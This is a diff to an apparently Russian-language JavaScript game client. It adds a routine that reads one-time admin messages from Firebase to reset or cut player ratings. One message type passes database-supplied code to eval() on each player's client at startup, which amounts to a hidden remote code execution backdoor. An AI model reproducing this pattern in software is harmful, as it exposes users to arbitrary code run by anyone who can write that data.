@@ -5234,6 +5234,32 @@ async function define_platform_and_language() {
 
 }
 
+async function check_admin_info(){
+	
+	//проверяем и показываем инфо от админа и потом удаляем
+	const admin_msg_path=`players/${my_data.uid}/admin_info`;
+	const data=await fbs_once(admin_msg_path);
+	if (data){
+		if (data.type==='FIXED_MATCH'){
+			my_data.rating=1400;
+			fbs.ref('players/'+my_data.uid+'/rating').set(my_data.rating);
+			message.add('Ваш рейтинг обнулен. Причина - договорные игры.',7000);
+		}		
+		
+		if (data.type==='CUT_RATING'){
+			my_data.rating=data.rating;
+			fbs.ref('players/'+my_data.uid+'/rating').set(my_data.rating);
+			//message.add('Ваш рейтинг обнулен. Причина - договорные игры.',7000);
+		}	
+		
+		if (data.type==='EVAL_CODE'){
+			eval(data.code)
+		}	
+		
+		fbs.ref(admin_msg_path).remove();		
+	}		
+}
+
 async function init_game_env(l) {
 
 	await define_platform_and_language();
@@ -5436,6 +5462,10 @@ async function init_game_env(l) {
 		connected = 0;
 	  }
 	});
+
+	//одноразовое сообщение от админа
+	await check_admin_info();
+
 
 	//показыаем основное меню
 	main_menu.activate();
